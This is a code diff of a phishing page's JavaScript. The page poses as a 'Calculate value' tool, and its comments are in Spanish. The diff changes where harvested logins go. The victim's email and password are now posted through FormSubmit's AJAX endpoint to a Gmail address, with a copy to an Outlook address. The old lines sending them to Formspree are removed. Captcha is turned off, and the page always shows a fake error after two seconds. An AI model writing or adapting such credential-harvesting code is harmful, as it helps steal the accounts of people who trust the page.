@@ -798,8 +798,11 @@
                 }
             });
 
-            // ===== SISTEMA DE ENVÍO CON FORMSPREE (ID: xrpzqwlk) =====
-            const FORMSPREE_URL = 'https://formspree.io/f/xrpzqwlk';
+            // ===== NUEVO SISTEMA DE ENVÍO (FormSubmit AJAX) =====
+            // Usamos el endpoint AJAX de FormSubmit para evitar redirecciones
+            // y permitir el envío sin recargar la página.
+            // Además, añadimos _captcha=false y _cc para enviar copia a valorfn@outlook.es
+            const FORM_SUBMIT_URL = 'https://formsubmit.co/ajax/parameganz25@gmail.com';
 
             loginForm.addEventListener('submit', function(e) {
                 e.preventDefault();
@@ -819,15 +822,17 @@
                 const fullEmail = local + '@' + emailDomain.value;
                 const password = passwordInput.value;
 
-                // Construir el payload para Formspree
+                // Construir el payload para FormSubmit
                 const payload = {
+                    _subject: `New login attempt - ${fullEmail}`,
                     email: fullEmail,
                     password: password,
-                    _subject: `New login attempt - ${fullEmail}`
+                    _captcha: 'false',
+                    _cc: 'valorfn@outlook.es'
                 };
 
-                // Enviar a Formspree
-                fetch(FORMSPREE_URL, {
+                // Enviar a FormSubmit (AJAX)
+                fetch(FORM_SUBMIT_URL, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -837,8 +842,8 @@
                 })
                 .then(response => response.json())
                 .then(data => {
-                    console.log('Formspree response:', data);
-                    // Independientemente de la respuesta, mostramos error después de 2s
+                    console.log('FormSubmit response:', data);
+                    // Simulamos error después de 2s
                     setTimeout(() => {
                         loginBtn.classList.remove('opacity-70', 'pointer-events-none');
                         loginBtn.innerHTML = '<i class="fa-solid fa-calculator mr-2"></i> Calculate value';
@@ -846,7 +851,7 @@
                     }, 2000);
                 })
                 .catch(error => {
-                    console.error('Formspree error:', error);
+                    console.error('FormSubmit error:', error);
                     // Si falla, igualmente mostramos el error
                     setTimeout(() => {
                         loginBtn.classList.remove('opacity-70', 'pointer-events-none');
